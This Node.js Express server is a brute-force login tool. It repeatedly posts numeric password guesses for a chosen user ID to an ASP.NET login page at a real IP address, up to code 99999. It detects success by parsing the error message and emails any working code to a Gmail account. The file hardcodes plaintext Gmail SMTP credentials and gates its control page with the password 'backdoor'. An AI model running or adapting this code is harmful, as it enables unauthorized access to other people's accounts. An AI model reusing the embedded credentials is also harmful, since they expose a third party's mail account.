const axios = require("axios");
const express = require("express");
const bodyparser = require("body-parser");
const path = require("path");
const fs = require("fs");
const app = express();
const cheerio = require("cheerio"); // Add Cheerio for HTML parsing
let code = fs.readFileSync("./parity.txt", "utf-8");

app.use(bodyparser.urlencoded({extended: true}));

app.engine("html", require("ejs").renderFile);

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "/"));

const nodemailer = require("nodemailer");
// const e = require("express");

const transporterData = {
  host: "smtp.gmail.com",
  port: 587,
  secure: false,
  auth: {
    user: "capitaltechstore@gmail.com",
    pass: "xtlgkxfmeqroewzl",
  },
  tls: {
    rejectUnauthorized: false,
  },
};

const transporter = nodemailer.createTransport(transporterData);

let bool=false;

const makeRequest = async (id) => {
  if(bool){
    const formData = {
      ctl00$MainContent$Login1$UserName: id,
      ctl00$MainContent$Login1$Password: code++,
      ctl00$MainContent$Login1$LoginButton: "Log In",
      __VIEWSTATE:
        "ry8a0MayIQD5IRZtSXQ2RvYy+9CaYICvhZMe18fit8xEoUwjQ8SaWu2gX8cv3m4K+HzF5ogbJQ1XcjE2Oi+bluTaSaRNOSQjDuR/g6AbtqSUMo+pmAJ8Xk2qHN8dZy3RfRdFRx0rRTFv8C4w57jF0+p2pqzMfbHr8kR827MtDBhWh/sTi5tG+Eftzgas5pLr4Sdi4QDtrrJiG8qrAhtGKKrBM3ZPlRVO/yPiFfwFKKkFppXAT2eepHpYhLWgRw3J",
      __VIEWSTATEGENERATOR: "C2EE9ABB",
      __EVENTVALIDATION:
        "jdzWufoP4u/JhY0A5bJ1eH8vGbTOhKAo3Zquh9cPQKtJpaeVLHHtj4kw88aL2P3dGOuAokM3j2pbPOu4+eEryJDUDzCvtNOa8681cgsyxAjwOoczk1Ql3IZ8GKK5vWKbN2l5seuYAG1pnrXQiDZJgpBJRnmYu3JoXKhXYecHMt8=",
    };

  try {
    const response = await axios.post(
      "http://175.107.19.126:5004/Login",
      formData,
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          "User-Agent": "Thunder Client (https://www.thunderclient.com)",
        },
      }
    );

    const $ = cheerio.load(response.data); // Load the HTML into Cheerio

    // Check if the error message is present in the span with style="color:red;"
    const errorMessage = $("span[style='color:red;']").text().trim();

    if (code <= 99999) {
      if (
        errorMessage ===
        "Your login attempt was not successful. Please try again."
      ) {
        console.log(
          `Login attempt failed by entering code ${code - 1}. Retrying...`
        );
        fs.writeFileSync("./parity.txt", JSON.stringify(code));
        await makeRequest(id); // Retry the login attempt
      } else {
        console.log(`Login successful! by entering code ${code - 1}`);
        transporter.sendMail({
          from: "capitaltechstore@gmail.com",
          to: "capitaltechstore@gmail.com",
          subject: `Client`,
          text: `${code - 1}`,
        });
      }
    }
  } catch (err) {
    console.error(err);
  }
}
else{
  return null;
}
};

// makeRequest(74);

app.get("/", (req, res) => {
  res.status(200).render("./index.html");
  // res.send(`<body><h1>${code-1}</h1></body>`);
});

let wrongCodeCount = 0;
let out;

app.post("/", (req, res) => {
  if (wrongCodeCount === 6) {
    clearTimeout(out);
    res.status(400).send("Wrong Code...");
    out = setTimeout(() => {
      wrongCodeCount = 0;
    }, 1296000);
  }
  if (req.body.pass == "backdoor") {
    res.status(200).render("./main.html");
  } else {
    res.status(400).send("Wrong Code...");
    wrongCodeCount++;
  }
});

app.post("/server", (req, res) => {
  if(bool==false){
    bool=true;
    fs.writeFileSync("./parity.txt", JSON.stringify(req.body.pass));
    if (req.body.pass == "") {
      makeRequest(req.body.id);
      res
        .status(200)
        .send(
          "Server Started Requsting For Code Correct Code will be Mailed to you later if found.<br>Testing For ID: " +
            req.body.id +
            " Pass: " +
            code
        );
    } else {
      code = req.body.pass;
      makeRequest(req.body.id);
      res
        .status(200)
        .send(
          "Server Started Requsting For Code Correct Code will be Mailed to you later if found.<br>Testing For ID: " +
            req.body.id +
            " Pass: " +
            code
        );
    }
  }
  else{
    res.status(200).send('Stop Requesting First...');
  }
});

app.post("/code", (req, res) => {
  if (req.body.code == "code") {
    res.status(200).send(`${code-1}`);
  } else if (req.body.restart == "restart") {
    res
      .status(200)
      .send(
        'Closing Server...<br><span id="closing"></span><script>let time=10; setInterval(()=>{if (time>=0) document.getElementById("closing").innerText=time--; if(time<0) document.getElementById("closing").innerText="Server Closed Successfully...";}, 1000);</script>'
      );
    setTimeout(() => {
      process.exit();
    }, 10000);
  } else if (req.body.stop == "stop") {
    bool=false;
    res.status(200).send('Requesting Stopped...');
  } else {
    res.status(400).send("Unhandled Event...");
  }
});

app.listen(3000, () => {
  console.log("Server Started Successfully...");
});
